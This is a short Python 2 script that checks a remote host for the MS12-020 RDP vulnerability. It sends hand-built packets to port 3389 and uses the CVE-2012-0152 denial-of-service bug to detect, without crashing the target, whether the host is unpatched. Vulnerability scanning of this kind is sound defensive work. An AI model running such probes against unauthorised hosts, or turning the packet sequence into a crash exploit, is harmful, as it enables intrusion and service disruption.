# -*- coding:utf-8 -*-
#
# MS12-020 remote safe checker (no BSOD)
#
# Use DoS bug (CVE-2012-0152) for check
#
# by Worawit Wang (sleepya)
#

import sys
import socket
from struct import pack,unpack

host = sys.argv[1]

def make_tpkt(data):
    return pack("!BBH", 3, 0, 4+len(data)) + data

def make_x224(type, data):
    return pack("!BB", 1+len(data), type) + data

def make_rdp(type, flags, data):
    return pack("<BBH", type, flags, 4+len(data)) + data


sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sk.settimeout(10)
try:
    sk.connect((host,3389))
except:
    print "Can't connect remote host on 3389!"
    sys.exit()

# connection request
# x224 type 0xe0 (dst_ref, src_ref, class_opts, data)
rdp = make_rdp(1, 0, pack("!I", 0))
x224_1 = make_x224(0xe0, pack("!HHB", 0, 0, 0) + rdp)
#sk.send(make_tpkt(x224_1))
sk.send("\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00")
data = sk.recv(8192)
if data != "\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00":
    print "Cannot check"
    sys.exit()

# x224 type 0xf0 (Data TPDU)
# - EOT (0x80)
x224_2 = make_x224(0xf0, pack("!B", 0x80))

# craft connect-initial with gcc
target_params = (""
    + "\x02\x01\x22" # maxChannelIds
    + "\x02\x01\x20" # maxUserIds
    + "\x02\x01\x00" # maxTokenIds
    + "\x02\x01\x01" # numPriorities
    + "\x02\x01\x00" # minThroughput
    + "\x02\x01\x01" # maxHeight
    + "\x02\x02\xff\xff" # maxMCSPDUSize
    + "\x02\x01\x02" # protocolVersion
)
min_params = (""
    + "\x02\x01\x01" # maxChannelIds       
    + "\x02\x01\x01" # maxUserIds          
    + "\x02\x01\x01" # maxTokenIds         
    + "\x02\x01\x01" # numPriorities       
    + "\x02\x01\x00" # minThroughput       
    + "\x02\x01\x01" # maxHeight           
    + "\x02\x01\xff" # maxMCSPDUSize
    + "\x02\x01\x02" # protocolVersion
)
max_params = (""
    + "\x02\x01\xff" # maxChannelIds           
    + "\x02\x01\xff" # maxUserIds              
    + "\x02\x01\xff" # maxTokenIds             
    + "\x02\x01\x01" # numPriorities           
    + "\x02\x01\x00" # minThroughput           
    + "\x02\x01\x01" # maxHeight               
    + "\x02\x02\xff\xff" # maxMCSPDUSize
    + "\x02\x01\x02" # protocolVersion
)
mcs_data = (""
    + "\x04\x01\x01" # callingDomainSelector
    + "\x04\x01\x01" # calledDomainSelector
    + "\x01\x01\xff" # upwardFlag
    + "\x30" + pack("B", len(target_params)) + target_params
    + "\x30" + pack("B", len(min_params)) + min_params
    + "\x30" + pack("B", len(max_params)) + max_params
    + "\x04\x00" # userData
)

# \x7f\x65  BER: APPLICATION 101 = Connect-Initial (MCS_TYPE_CONNECTINITIAL)
mcs = "\x7f\x65" + pack("!B", len(mcs_data))
sk.send(make_tpkt(x224_2 + mcs + mcs_data))

# attach user request
sk.send(make_tpkt(x224_2 + "\x28"))
data = sk.recv(8192)
user1 = unpack("!H", data[9:11])[0]

sk.send(make_tpkt(x224_2 + "\x28"))
data = sk.recv(8192)
user2 = unpack("!H", data[9:11])[0]

# join its own channel (prevent BSOD)
sk.send(make_tpkt(x224_2 + "\x38" + pack("!HH", user2, user2+1001)))
data = sk.recv(8192)

# channel join request
sk.send(make_tpkt(x224_2 + "\x38" + pack("!HH", user1, user2+1001)))
data = sk.recv(8192)
if data[7:9] == "\x3e\x00":
    print "!!! VULN !!!"
else:
    print "patched"

sk.close()
